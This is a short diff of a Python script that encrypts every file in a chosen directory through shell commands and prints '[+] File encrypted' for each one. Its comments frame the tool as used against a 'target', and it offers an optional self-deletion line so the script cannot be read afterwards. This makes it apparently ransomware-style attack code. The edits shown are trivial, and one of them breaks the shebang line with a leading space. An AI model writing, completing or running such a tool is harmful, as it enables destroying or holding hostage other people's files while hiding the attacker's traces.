@@ -1,4 +1,4 @@
-#!/usr/bin/env python3 
+ #!/usr/bin/env python3 
 import sys
 import os
 import subprocess
@@ -21,7 +21,7 @@ if len(sys.argv) > 1:
 		subprocess.run(cmd, shell=True)
 		print("  [+] File encrypted :", file) 
 
-		#delete script file 
+		#delete script file after execution
 		#os.remove(__file__) /// uncomment to be unreadable by your target
 else :
 	print("Please select a directory to encrypt files")
